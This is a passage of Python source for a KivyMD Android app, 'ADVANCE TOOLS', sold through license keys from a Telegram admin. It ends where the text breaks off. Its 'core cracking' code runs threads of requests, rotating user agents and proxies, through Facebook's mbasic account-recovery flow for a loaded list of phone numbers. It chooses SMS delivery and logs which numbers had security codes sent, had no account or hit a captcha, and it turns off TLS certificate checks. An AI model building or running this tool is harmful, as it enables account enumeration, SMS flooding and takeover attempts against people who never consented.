import threading
import queue
import requests
import random
import re
import os
import time
import sys
import webbrowser
from datetime import datetime
from urllib.parse import unquote

# --- KIVY & KIVYMD IMPORTS ---
from kivy.lang import Builder
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.utils import platform
from kivy.core.clipboard import Clipboard
from kivymd.app import MDApp
from kivymd.uix.screen import MDScreen
from kivymd.uix.list import TwoLineAvatarIconListItem, IconLeftWidget
from kivymd.uix.snackbar import Snackbar
from kivymd.uix.dialog import MDDialog
from kivymd.uix.button import MDFlatButton, MDRaisedButton, MDFillRoundFlatButton
from kivymd.uix.filemanager import MDFileManager
from kivymd.uix.chip import MDChip
from kivymd.uix.taptargetview import MDTapTargetView
from kivymd.toast import toast
from bs4 import BeautifulSoup
from kivy.properties import StringProperty, NumericProperty, BooleanProperty, ListProperty

# --- CONFIGURATION ---
class BotConfig:
    TOOL_NAME = "ADVANCE TOOLS"
    VERSION = "3.5.0 ULTIMATE"
    ADMIN_USERNAME = "toolsadmin_A"
    ADMIN_URL = "https://t.me/toolsadmin_A"
    CHANNEL_URL = "https://t.me/AdvanceMobileTools"
    KEY_URL = "https://script.google.com/macros/s/AKfycbz0qQGXtFxyfanZb33MAuSYN3Mch_3bGuYRZ2Nxw1kHA0qxqq5urusH3sf2k1EHgORR/exec"

# --- DEVICE ID LOGIC (SAFE MODE) ---
def get_device_id():
    try:
        if platform == 'android':
            from jnius import autoclass
            Secure = autoclass('android.provider.Settings$Secure')
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            context = PythonActivity.mActivity.getContentResolver()
            device_id = Secure.getString(context, Secure.ANDROID_ID)
            return device_id if device_id else "ANDROID_UNKNOWN"
        else:
            import uuid
            return str(uuid.getnode())
    except Exception as e:
        print(f"Error getting Device ID: {e}")
        return "UNKNOWN_DEVICE"

# --- KEY VALIDATION LOGIC ---
def validate_key_sync(key, hwid):
    try:
        url = f"{BotConfig.KEY_URL}?action=check&key={key}&hwid={hwid}"
        # Added verify=False to prevent SSL crash on some older Androids if certs are missing
        response = requests.get(url, timeout=15, verify=False)
        return response.text.strip()
    except:
        return "CONNECTION_ERROR"

# --- UI LAYOUT (KV LANGUAGE) ---
KV = '''
#:import HexColor kivy.utils.get_color_from_hex
#:import BotConfig __main__.BotConfig

# --- CUSTOM COMPONENTS ---
<StatCard@MDCard>:
    title: ""
    count: "0"
    icon: "android"
    icon_color: "#10B981"
    # Slate 900 background for cards
    md_bg_color: HexColor("#111827")
    radius: [16]
    elevation: 2
    padding: dp(12)
    spacing: dp(5)
    orientation: "vertical"
    size_hint: 0.48, None
    height: dp(100)
    ripple_behavior: True
    
    MDIcon:
        icon: root.icon
        theme_text_color: "Custom"
        text_color: HexColor(root.icon_color)
        font_size: dp(28)
        pos_hint: {"right": 1}
    
    MDLabel:
        text: root.title
        font_style: "Overline"
        theme_text_color: "Custom"
        text_color: HexColor("#94A3B8")
        bold: True
        adaptive_height: True
    
    MDLabel:
        text: root.count
        font_style: "H5"
        theme_text_color: "Custom"
        text_color: HexColor("#F8FAFC")
        bold: True
        adaptive_height: True

<NavButton@MDIconButton>:
    theme_text_color: "Custom"
    text_color: HexColor("#64748B")
    user_font_size: "24sp"
    
# --- SCREENS ---
ScreenManager:
    KeyScreen:
    MainScreen:

<KeyScreen>:
    name: "key_screen"
    # Main Background: Nearly Black #050507
    md_bg_color: HexColor("#050507")

    MDBoxLayout:
        orientation: "vertical"
        padding: dp(30)
        spacing: dp(30)
        pos_hint: {"center_x": .5, "center_y": .5}
        adaptive_height: True

        # Logo/Icon Area
        MDCard:
            size_hint: None, None
            size: dp(80), dp(80)
            radius: [40]
            md_bg_color: HexColor("#1e293b")
            pos_hint: {"center_x": .5}
            elevation: 10
            
            MDIcon:
                icon: "shield-check"
                halign: "center"
                valign: "center"
                theme_text_color: "Custom"
                text_color: HexColor("#10B981")
                font_size: dp(40)
                size_hint: 1, 1

        MDBoxLayout:
            orientation: "vertical"
            adaptive_height: True
            spacing: dp(5)
            
            MDLabel:
                text: "SECURE ACCESS"
                halign: "center"
                font_style: "H5"
                bold: True
                theme_text_color: "Custom"
                text_color: HexColor("#FFFFFF")
            
            MDLabel:
                text: "Authentication Required"
                halign: "center"
                font_style: "Caption"
                theme_text_color: "Custom"
                text_color: HexColor("#64748B")

        # Input Area
        MDCard:
            orientation: "vertical"
            padding: dp(20)
            spacing: dp(15)
            radius: [20]
            md_bg_color: HexColor("#111827")
            size_hint_x: 1
            adaptive_height: True
            elevation: 4

            MDTextField:
                id: key_input
                hint_text: "ENTER LICENSE KEY"
                mode: "fill"
                fill_color_normal: HexColor("#000000")
                fill_color_focus: HexColor("#000000")
                text_color_normal: HexColor("#FFFFFF")
                text_color_focus: HexColor("#10B981")
                hint_text_color_focus: HexColor("#10B981")
                line_color_focus: HexColor("#10B981")
                icon_right: "key-variant"
                icon_right_color: HexColor("#64748B")

            MDRaisedButton:
                text: "UNLOCK SYSTEM"
                font_size: "16sp"
                size_hint_x: 1
                height: dp(50)
                md_bg_color: HexColor("#10B981")
                text_color: 0, 0, 0, 1
                on_release: app.check_key(key_input.text)
                elevation: 0

        MDLabel:
            text: f"DEVICE ID: {app.device_id}"
            halign: "center"
            font_style: "Overline"
            theme_text_color: "Custom"
            text_color: HexColor("#334155")

        MDFlatButton:
            text: "GET KEY FROM ADMIN"
            pos_hint: {"center_x": .5}
            theme_text_color: "Custom"
            text_color: HexColor("#38BDF8")
            on_release: app.contact_admin()

<MainScreen>:
    name: "main_screen"
    md_bg_color: HexColor("#050507")

    MDBoxLayout:
        orientation: 'vertical'

        # --- HEADER ---
        MDBoxLayout:
            size_hint_y: None
            height: dp(60)
            padding: [dp(20), 0]
            md_bg_color: HexColor("#0F172A")
            
            MDBoxLayout:
                orientation: "vertical"
                adaptive_height: True
                pos_hint: {"center_y": .5}
                
                MDLabel:
                    text: "ADVANCE [color=10B981]TOOLS[/color]"
                    markup: True
                    font_style: "H6"
                    bold: True
                    theme_text_color: "Custom"
                    text_color: HexColor("#FFFFFF")
                    adaptive_height: True
                
                MDLabel:
                    text: "System Active" if app.is_running_flag else "System Idle"
                    font_style: "Overline"
                    theme_text_color: "Custom"
                    text_color: HexColor("#10B981") if app.is_running_flag else HexColor("#64748B")
                    adaptive_height: True

            Widget:

            MDIconButton:
                id: start_btn_icon
                icon: "stop-circle-outline" if app.is_running_flag else "play-circle-outline"
                theme_text_color: "Custom"
                text_color: HexColor("#EF4444") if app.is_running_flag else HexColor("#10B981")
                user_font_size: "32sp"
                pos_hint: {"center_y": .5}
                on_release: app.stop_process() if app.is_running_flag else app.start_process()

        # --- BODY CONTENT (Switched via Bottom Nav) ---
        MDBottomNavigation:
            id: bottom_nav
            panel_color: HexColor("#0F172A")
            selected_color_background: HexColor("#0F172A")
            text_color_active: HexColor("#10B981")
            text_color_normal: HexColor("#64748B")
            use_text: True

            # --- DASHBOARD TAB ---
            MDBottomNavigationItem:
                name: 'screen_home'
                text: 'Dash'
                icon: 'view-dashboard'
                
                MDBoxLayout:
                    orientation: 'vertical'
                    padding: dp(15)
                    spacing: dp(15)
                    md_bg_color: HexColor("#050507")

                    # Live Status
                    MDCard:
                        size_hint_y: None
                        height: dp(50)
                        radius: [12]
                        md_bg_color: HexColor("#111827")
                        padding: dp(15)
                        
                        MDLabel:
                            text: "NETWORK STATUS"
                            font_style: "Caption"
                            theme_text_color: "Custom"
                            text_color: HexColor("#94A3B8")
                            pos_hint: {"center_y": .5}
                        
                        MDSpinner:
                            id: spinner
                            size_hint: None, None
                            size: dp(20), dp(20)
                            active: False
                            palette: [HexColor("#10B981")]
                            pos_hint: {'center_y': .5}
                        
                        Widget:
                            size_hint_x: None
                            width: dp(10)

                        MDLabel:
                            text: app.elapsed_time
                            halign: "right"
                            font_style: "Subtitle2"
                            theme_text_color: "Custom"
                            text_color: HexColor("#FFFFFF")
                            pos_hint: {"center_y": .5}

                    # Stats Grid
                    MDGridLayout:
                        cols: 2
                        spacing: dp(10)
                        size_hint_y: None
                        height: dp(220)
                        
                        StatCard:
                            title: "TOTAL NUMBER"
                            count: app.stat_total
                            icon: "layers"
                            icon_color: "#3B82F6" # Blue
                        
                        StatCard:
                            title: "CODE SEND"
                            count: app.stat_success
                            icon: "check-circle"
                            icon_color: "#10B981" # Emerald
                        
                        StatCard:
                            title: "NO ACCOUNT"
                            count: app.stat_fail
                            icon: "alert-circle"
                            icon_color: "#EF4444" # Red
                        
                        StatCard:
                            title: "CAPTCHA"
                            count: app.stat_captcha
                            icon: "shield-alert"
                            icon_color: "#F59E0B" # Yellow

                    # Input Area
                    MDCard:
                        orientation: "vertical"
                        padding: dp(15)
                        radius: [16]
                        md_bg_color: HexColor("#111827")
                        
                        MDTextField:
                            id: input_box
                            hint_text: "Target List"
                            mode: "rectangle"
                            multiline: True
                            size_hint_y: 1
                            line_color_normal: HexColor("#334155")
                            line_color_focus: HexColor("#10B981")
                            text_color_normal: HexColor("#E2E8F0")
                            hint_text_color_focus: HexColor("#10B981")
                        
                        Widget:
                            size_hint_y: None
                            height: dp(10)

                        MDRaisedButton:
                            id: btn_load_file
                            text: "LOAD FILE"
                            icon: "file-upload"
                            size_hint_x: 1
                            md_bg_color: HexColor("#334155")
                            on_release: app.file_manager_open("numbers")

            # --- LOGS TAB (Terminal Style) ---
            MDBottomNavigationItem:
                name: 'screen_console'
                text: 'Logs'
                icon: 'console'
                
                MDBoxLayout:
                    orientation: 'vertical'
                    md_bg_color: HexColor("#0A0A0C")
                    padding: dp(10)
                    
                    MDBoxLayout:
                        size_hint_y: None
                        height: dp(30)
                        md_bg_color: HexColor("#111827")
                        padding: [dp(10), 0]
                        
                        MDLabel:
                            text: "> SYSTEM_LOGS"
                            font_style: "Caption"
                            font_name: "RobotoMono-Regular" if app.has_mono_font else "Roboto"
                            theme_text_color: "Custom"
                            text_color: HexColor("#10B981")
                            bold: True
                            pos_hint: {"center_y": .5}

                    ScrollView:
                        do_scroll_x: False
                        bar_width: dp(4)
                        bar_color: HexColor("#334155")
                        
                        MDLabel:
                            id: console_log
                            text: "System initialized... waiting for command."
                            font_name: "RobotoMono-Regular" if app.has_mono_font else "Roboto"
                            font_size: "11sp"
                            size_hint_y: None
                            height: self.texture_size[1]
                            theme_text_color: "Custom"
                            text_color: HexColor("#22D3EE")
                            padding: [dp(10), dp(10)]
                            valign: "bottom"

            # --- HITS TAB ---
            MDBottomNavigationItem:
                name: 'screen_success'
                text: 'Codes'
                icon: 'trophy'
                
                MDBoxLayout:
                    orientation: 'vertical'
                    md_bg_color: HexColor("#050507")
                    
                    MDTopAppBar:
                        title: "CODE SENT LIST"
                        md_bg_color: HexColor("#0F172A")
                        specific_text_color: HexColor("#FFFFFF")
                        right_action_items: [["content-save", lambda x: app.save_hits()], ["content-copy", lambda x: app.copy_hits()], ["delete", lambda x: app.clear_results()]]
                        elevation: 0

                    ScrollView:
                        MDList:
                            id: list_success
                            spacing: dp(5)
                            padding: dp(10)

            # --- CONFIG TAB ---
            MDBottomNavigationItem:
                name: 'screen_settings'
                text: 'Config'
                icon: 'cog'
                
                MDBoxLayout:
                    orientation: 'vertical'
                    padding: dp(20)
                    spacing: dp(20)
                    md_bg_color: HexColor("#050507")

                    MDLabel:
                        text: "CONFIGURATION"
                        font_style: "H6"
                        theme_text_color: "Custom"
                        text_color: HexColor("#10B981")
                        adaptive_height: True

                    # Thread Control
                    MDCard:
                        orientation: "vertical"
                        padding: dp(15)
                        radius: [16]
                        md_bg_color: HexColor("#111827")
                        adaptive_height: True
                        spacing: dp(10)
                        
                        MDBoxLayout:
                            adaptive_height: True
                            MDIcon:
                                icon: "cpu-64-bit"
                                theme_text_color: "Custom"
                                text_color: HexColor("#10B981")
                            MDLabel:
                                text: f"  Thread Control: {int(thread_slider.value)}"
                                theme_text_color: "Custom"
                                text_color: HexColor("#FFFFFF")
                                bold: True
                        
                        MDSlider:
                            id: thread_slider
                            min: 1
                            max: 50
                            value: 20
                            color: HexColor("#10B981")
                            hint: False

                    # Proxy Config
                    MDCard:
                        orientation: "vertical"
                        padding: dp(15)
                        radius: [16]
                        md_bg_color: HexColor("#111827")
                        adaptive_height: True
                        spacing: dp(15)
                        
                        MDBoxLayout:
                            adaptive_height: True
                            MDIcon:
                                icon: "earth"
                                theme_text_color: "Custom"
                                text_color: HexColor("#8B5CF6") # Purple
                            MDLabel:
                                text: "  Proxy Configuration"
                                theme_text_color: "Custom"
                                text_color: HexColor("#FFFFFF")
                                bold: True
                            MDSwitch:
                                id: proxy_switch
                                active: False
                                thumb_color_down: HexColor("#10B981")
                        
                        MDBoxLayout:
                            adaptive_height: True
                            spacing: dp(5)
                            
                            MDFillRoundFlatButton:
                                text: "HTTP"
                                font_size: "12sp"
                                md_bg_color: HexColor("#10B981") if app.proxy_type == "http" else HexColor("#1F2937")
                                text_color: [0,0,0,1] if app.proxy_type == "http" else [1,1,1,1]
                                on_release: app.set_proxy_type("http")
                            
                            MDFillRoundFlatButton:
                                text: "SOCKS4"
                                font_size: "12sp"
                                md_bg_color: HexColor("#10B981") if app.proxy_type == "socks4" else HexColor("#1F2937")
                                text_color: [0,0,0,1] if app.proxy_type == "socks4" else [1,1,1,1]
                                on_release: app.set_proxy_type("socks4")
                                
                            MDFillRoundFlatButton:
                                text: "SOCKS5"
                                font_size: "12sp"
                                md_bg_color: HexColor("#10B981") if app.proxy_type == "socks5" else HexColor("#1F2937")
                                text_color: [0,0,0,1] if app.proxy_type == "socks5" else [1,1,1,1]
                                on_release: app.set_proxy_type("socks5")

                        MDRaisedButton:
                            text: "LOAD PROXY LIST"
                            size_hint_x: 1
                            md_bg_color: HexColor("#334155")
                            on_release: app.file_manager_open("proxy")
                        
                        MDLabel:
                            id: proxy_status
                            text: "No Proxies Loaded"
                            halign: "center"
                            font_style: "Caption"
                            theme_text_color: "Hint"

                    # Support
                    MDRaisedButton:
                        text: "JOIN TELEGRAM CHANNEL"
                        icon: "send"
                        size_hint_x: 1
                        height: dp(50)
                        md_bg_color: HexColor("#0EA5E9") # Sky Blue
                        on_release: app.contact_admin()
                        
                    MDLabel:
                        text: "v3.5.0 ULTIMATE"
                        halign: "center"
                        font_style: "Caption"
                        theme_text_color: "Hint"
'''

# --- SCREEN CLASSES ---
class KeyScreen(MDScreen): pass
class MainScreen(MDScreen): pass

# --- GLOBAL VARIABLES ---
is_running = False
stats = {"success": 0, "fail": 0, "captcha": 0, "total": 0}
proxies_list = []
success_numbers = []
start_time = None

# --- UPDATED USER AGENTS (45+ Total) ---
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; vivo 1906) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; HUAWEI VNS-L31) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0.2; SM-T535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; TECNO KE5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; itel A44 Air) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; RMX2001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-J105H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-J415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; ILIAN X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; 5056D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-J600F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.1; SM-J510F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1; A33f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; P8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; MYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; LDN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
]

# --- UTILS ---
def force_mbasic(url):
    if not url: return "https://mbasic.facebook.com/login/identify/"
    if "facebook.com" in url:
        return url.replace("www.facebook.com", "mbasic.facebook.com").replace("m.facebook.com", "mbasic.facebook.com").replace("free.facebook.com", "mbasic.facebook.com").replace("d.facebook.com", "mbasic.facebook.com")
    return url

def format_action_url(action):
    if not action: return "https://mbasic.facebook.com/login/identify/"
    if action.startswith("http"): return force_mbasic(action)
    return "https://mbasic.facebook.com" + action

# --- CORE CRACKING LOGIC ---
def check_and_follow_redirect(session, content, headers):
    try:
        soup = BeautifulSoup(content, 'html.parser')
        redirect_url = None
        meta = soup.find('meta', attrs={'http-equiv': re.compile(r'^refresh$', re.I)})
        if meta:
            match = re.search(r'url\s*=\s*([^;]+)', meta.get('content', ''), re.I)
            if match: redirect_url = unquote(match.group(1).strip("'\""))
        
        if not redirect_url:
            for script in soup.find_all('script'):
                if script.string:
                    match = re.search(r'(?:window|document)\.location(?:\.href)?\s*=\s*["\']([^"\']+)["\']', script.string)
                    if match:
                        redirect_url = unquote(match.group(1).replace('\\/', '/'))
                        break
        
        if redirect_url:
            return session.get(force_mbasic(redirect_url), headers=headers, timeout=15, verify=False)
    except: pass
    return None

def check_success_logic(soup, content_str):
    text_lower = content_str.lower()
    keywords = ["enter the 6-digit code", "we sent a code", "check your sms", "enter security code", "digit code", "we've sent your code"]
    if any(k in text_lower for k in keywords): return True
    return bool(soup.find('input', {'name': 'n'}))

def execute_cracking(number, use_proxy, proxy_type):
    try:
        session = requests.Session()
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        
        if use_proxy and proxies_list:
            prx = random.choice(proxies_list)
            if "socks" in proxy_type:
                session.proxies = {"http": f"{proxy_type}://{prx}", "https": f"{proxy_type}://{prx}"}
            else:
                session.proxies = {"http": f"http://{prx}", "https": f"http://{prx}"}

        url = "https://mbasic.facebook.com/login/identify/"
        try:
            req1 = session.get(url, headers=headers, timeout=15, verify=False)
        except: return 'net_error'

        redir = check_and_follow_redirect(session, req1.content, headers)
        if redir: req1 = redir

        soup = BeautifulSoup(req1.content, 'html.parser')
        
        if "error" in soup.title.get_text().lower(): return 'blocked'
        
        form = soup.find('form', {'method': 'post'})
        if not form: return 'error'

        action = format_action_url(form.get('action', ''))
        data = {inp.get('name'): inp.get('value', '') for inp in form.find_all('input') if inp.get('name')}
        data['email'] = number
        
        try:
            req_next = session.post(action, headers=headers, data=data, timeout=15, verify=False)
        except: return 'net_error'

        for _ in range(4):
            redir = check_and_follow_redirect(session, req_next.content, headers)
            if redir: req_next = redir
            
            soup = BeautifulSoup(req_next.content, 'html.parser')
            if check_success_logic(soup, req_next.text): return 'success'
            if "captcha" in req_next.text.lower(): return 'captcha'
            if "did not match" in req_next.text.lower(): return 'not_found'

            form = soup.find('form', {'method': 'post'})
            if not form: break
            
            data = {inp.get('name'): inp.get('value', '') for inp in form.find_all('input') if inp.get('name')}
            radios = form.find_all('input', {'type': 'radio'})
            if radios:
                found_sms = False
                for r in radios:
                    if "sms" in r.get('value', '').lower():
                        data[r.get('name')] = r.get('value')
                        found_sms = True; break
                if not found_sms: data[radios[0].get('name')] = radios[0].get('value')
            
            sub = form.find(['input', 'button'], {'type': 'submit'})
            if sub and sub.get('name'): data[sub.get('name')] = sub.get('value', '')
            
            action = format_action_url(form.get('action', ''))
            try:
                req_next = session.post(action, headers=headers, data=data, timeout=15, verify=False)
            except: return 'net_error'

        return 'fail'
    except: return 'error'

# --- THREAD WORKER ---
def worker(numbers_q, app_instance, use_proxy, proxy_type):
    while is_running and not numbers_q.empty():
        try:
            number = numbers_q.get()
            app_instance.log_to_console(f"[EXEC] Checking {number}...")
            result = execute_cracking(number, use_proxy, proxy_type)
            
            if result == 'success':
                stats['success'] += 1
                success_numbers.append(number)
                app_instance.add_result_item(number)
                app_instance.log_to_console(f"[HIT] Success: {number}")
            elif result == 'captcha': 
                stats['captcha'] += 1
                app_instance.log_to_console(f"[CAPTCHA] {number}")
            else: 
                stats['fail'] += 1
            
            app_instance.update_stats_ui()
        except: pass
        finally: numbers_q.task_done()
    
    if numbers_q.empty() and is_running: 
        Clock.schedule_once(lambda dt: app_instance.stop_process(finished=True))

# --- MAIN APP ---
class AdvanceToolsApp(MDApp):
    device_id = StringProperty("...")
    version_info = StringProperty(BotConfig.VERSION)
    stat_total = StringProperty("0")
    stat_success = StringProperty("0")
    stat_fail = StringProperty("0")
    stat_captcha = StringProperty("0")
    elapsed_time = StringProperty("00:00:00")
    proxy_type = StringProperty("http")
    has_mono_font = BooleanProperty(False)
    is_running_flag = BooleanProperty(False)
    
    # Tutorial state
    tap_target_view = None
    tutorial_steps = []

    def build(self):
        self.theme_cls.theme_style = "Dark"
        self.theme_cls.primary_palette = "Green"
        self.theme_cls.accent_palette = "Teal"
        self.request_android_permissions()
        self.device_id = get_device_id()
        return Builder.load_string(KV)

    def request_android_permissions(self):
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            try:
                # Android 13+ requires specific permissions for media if you browse it
                permissions = [
                    Permission.READ_EXTERNAL_STORAGE, 
                    Permission.WRITE_EXTERNAL_STORAGE,
                    Permission.INTERNET
                ]
                request_permissions(permissions)
            except Exception as e: print(f"Permission Error: {e}")

    def on_start(self):
        try:
            if os.path.exists("key.txt"):
                with open("key.txt", "r") as f: k = f.read().strip()
                if k: threading.Thread(target=self.auto_validate, args=(k,)).start()
        except Exception as e: toast(f"Init Error: {e}")
        
        # Start tutorial check if authenticated (or just after build if key exists)
        # We'll check inside switch_to_main to ensure screen is loaded

    def auto_validate(self, key):
        if validate_key_sync(key, self.device_id) == "APPROVED":
            Clock.schedule_once(lambda dt: self.switch_to_main())

    def check_key(self, key):
        if not key: return toast("Enter Key")
        threading.Thread(target=self.bg_validate, args=(key,)).start()

    def bg_validate(self, key):
        if validate_key_sync(key, self.device_id) == "APPROVED":
            try:
                with open("key.txt", "w") as f:
                    f.write(key)
            except:
                pass
            Clock.schedule_once(lambda dt: self.switch_to_main())
        else:
            Clock.schedule_once(lambda dt: toast("Invalid Key"))

    def switch_to_main(self): 
        self.root.current = "main_screen"
        Clock.schedule_once(self.check_tutorial, 1.5)

    def contact_admin(self): webbrowser.open(BotConfig.ADMIN_URL)

    # --- TUTORIAL SYSTEM ---
    def check_tutorial(self, dt):
        if not os.path.exists("tutorial.lock"):
            self.start_tutorial_sequence()

    def start_tutorial_sequence(self):
        # We need to access widgets by IDs.
        # Sequence: Load File -> Start Attack -> Config Tab
        screen = self.root.get_screen('main_screen')
        
        # Define steps
        self.tutorial_steps = [
            {
                "widget": screen.ids.btn_load_file,
                "title": "Step 1: Load Targets",
                "desc": "Click here to select your numbers file (.txt)"
            },
            {
                "widget": screen.ids.start_btn_icon,
                "title": "Step 2: Start Engine",
                "desc": "Once loaded, click here to begin the process"
            },
            # Accessing bottom nav item is tricky via ID directly if not exposed, 
            # so we'll stop at the main actions for now or try to target the widget instance
        ]
        
        self.show_next_tutorial_step()

    def show_next_tutorial_step(self):
        if not self.tutorial_steps:
            # Done
            with open("tutorial.lock", "w") as f: f.write("done")
            return

        step = self.tutorial_steps.pop(0)
        widget = step["widget"]
        
        self.tap_target_view = MDTapTargetView(
            widget=widget,
            title_text=step["title"],
            description_text=step["desc"],
            widget_position="center",
            title_position="bottom",
            outer_circle_color=(0.06, 0.72, 0.5, 1), # Emerald
            target_circle_color=(1, 1, 1, 1),
            title_text_color=(1, 1, 1, 1),
            description_text_color=(0.9, 0.9, 0.9, 1),
            draw_shadow=True,
            stop_on_outer_touch=False,
        )
        self.tap_target_view.bind(on_close=self.on_tutorial_close)
        self.tap_target_view.start()

    def on_tutorial_close(self, instance, *args):
        # Proceed to next step
        Clock.schedule_once(lambda dt: self.show_next_tutorial_step(), 0.5)

    # --- FILE MANAGER ---
    def file_manager_open(self, mode):
        self.file_mode = mode
        path = "/"
        if platform == 'android':
            try:
                from android.storage import primary_external_storage_path
                path = primary_external_storage_path()
            except: path = "/storage/emulated/0"
        self.file_manager = MDFileManager(exit_manager=self.exit_manager, select_path=self.select_path, preview=False)
        self.file_manager.show(path)

    def select_path(self, path):
        self.exit_manager()
